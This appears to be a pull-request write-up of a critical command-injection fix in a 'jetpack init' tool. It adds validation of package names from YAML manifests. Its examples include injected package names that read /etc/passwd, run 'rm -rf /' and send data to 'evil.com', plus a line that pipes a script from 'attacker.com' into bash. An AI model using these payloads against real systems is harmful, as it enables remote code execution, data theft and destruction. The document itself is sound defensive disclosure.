# Security Fix: Command Injection Vulnerability

## Vulnerability Description

**Severity**: CRITICAL  
**CVSS Score**: 9.8 (Critical)  
**Discovered**: 2026-02-10 during Phase 3 testing  
**Status**: Fixed in this PR

### The Problem

Package names from `.onboard.yaml` manifest files were directly interpolated into shell commands without any validation or sanitization. This allowed arbitrary command execution when a malicious manifest contained shell metacharacters in package names.

### Attack Vector

An attacker could create a malicious GitHub repository with a weaponized `.onboard.yaml` manifest:

```yaml
name: malicious-project
description: Looks innocent but contains command injection

dependencies:
  system:
    - "git; whoami"                    # Executes whoami command
    - "nodejs && cat /etc/passwd"      # Reads system files
  npm:
    - "express || rm -rf /"            # Could delete filesystem
  python:
    - "requests | curl evil.com/log"  # Exfiltrate data
```

When a victim runs `jetpack init attacker/malicious-repo`, the injected commands execute with the victim's privileges.

### Impact

**Affected Platforms**: All (Windows, macOS, Linux)

**Affected Commands**:
- System packages: `choco install`, `brew install`, `sudo apt-get install`, `sudo yum install`
- NPM packages: `npm install -g`
- Python packages: `pip install`

**Consequences**:
- Complete system compromise
- Data exfiltration
- Privilege escalation (via sudo commands on Linux)
- Arbitrary file system modifications
- Installation of malware

### Example Exploit

```bash
# Victim runs
jetpack init evil-user/innocent-looking-repo

# Manifest contains
dependencies:
  system: ["git; curl http://attacker.com/malware.sh | bash"]

# Results in execution of
choco install git; curl http://attacker.com/malware.sh | bash -y
```

## The Fix

### Solution

Added package name validation at manifest parse time (fail-fast approach):

1. **New function**: `validatePackageName()` in `src/detectors/manifest-parser.js`
2. **Validation pattern**: `/^[@a-zA-Z0-9._/-]+$/`
3. **Applied to**: All dependency types (system, npm, python)
4. **Error handling**: Clear error messages for users

### What's Allowed

- Letters: `a-z`, `A-Z`
- Numbers: `0-9`
- Special characters: `@`, `.`, `_`, `-`, `/`
- Examples: `git`, `nodejs`, `@angular/cli`, `python-dev`

### What's Blocked

- Shell metacharacters: `;`, `&&`, `||`, `|`, `$`, `` ` ``, `>`, `<`, `\n`, etc.
- Spaces (package names shouldn't have spaces)
- Any other special characters

### Code Changes

**File**: `src/detectors/manifest-parser.js`

```javascript
function validatePackageName(packageName) {
  const validPattern = /^[@a-zA-Z0-9._/-]+$/;
  
  if (!validPattern.test(packageName)) {
    throw new Error(
      `Invalid package name: "${packageName}". ` +
      `Package names can only contain letters, numbers, hyphens, underscores, dots, @ and /. ` +
      `Shell metacharacters are not allowed for security reasons.`
    );
  }
  
  return true;
}

// Applied in extractDependencies():
dependencies.system = manifest.dependencies.system
  .filter(dep => typeof dep === 'string' && dep.trim().length > 0)
  .map(dep => {
    const trimmed = dep.trim();
    validatePackageName(trimmed);  // ← Security validation
    return trimmed;
  });
```

## Testing

### Security Tests

✅ **Malicious manifest blocked**:
```javascript
// tests/malicious-manifest.yaml - blocked successfully
dependencies:
  system: ["git; whoami"]  // Throws error with clear message
```

✅ **Error message clarity**:
```
Error: Invalid package name: "git; whoami". 
Package names can only contain letters, numbers, hyphens, underscores, dots, @ and /. 
Shell metacharacters are not allowed for security reasons.
```

### Regression Tests

✅ **All existing tests pass**: 27/27 (100%)
- 8 manifest parser tests
- 14 manifest fetcher tests
- 5 dependency installer tests

✅ **Legitimate packages work**:
- Simple names: `git`, `nodejs`, `python3`
- Scoped packages: `@angular/cli`, `@babel/core`
- Hyphenated: `typescript`, `python-dev`
- With dots: `node.js` (though unusual)

## Breaking Changes

**None** - All legitimate package names continue to work.

The only "breaking change" is that malicious manifests will now be rejected, which is the intended behavior.

## Recommendations

### For Users

1. **Update immediately**: This is a critical security fix
2. **Review manifests**: If a manifest fails validation, inspect it carefully
3. **Report suspicious repos**: If you encounter a rejected manifest from a public repo, report it

### For Future Development

1. **Consider using `execFile` instead of `execSync`**: Pass arguments as arrays to avoid shell interpretation
2. **Add CSP-like policies**: Allow users to whitelist package sources
3. **Implement signature verification**: Verify manifest authenticity
4. **Add audit logging**: Log all package installations for security monitoring

## References

- **CWE-78**: OS Command Injection
- **OWASP**: Command Injection
- **CVE Database**: Similar vulnerabilities in package managers

## Credits

**Discovered by**: Code review agent during Phase 3 testing  
**Fixed by**: GitHub Copilot CLI  
**Review confidence**: 100%  
**Date**: 2026-02-10
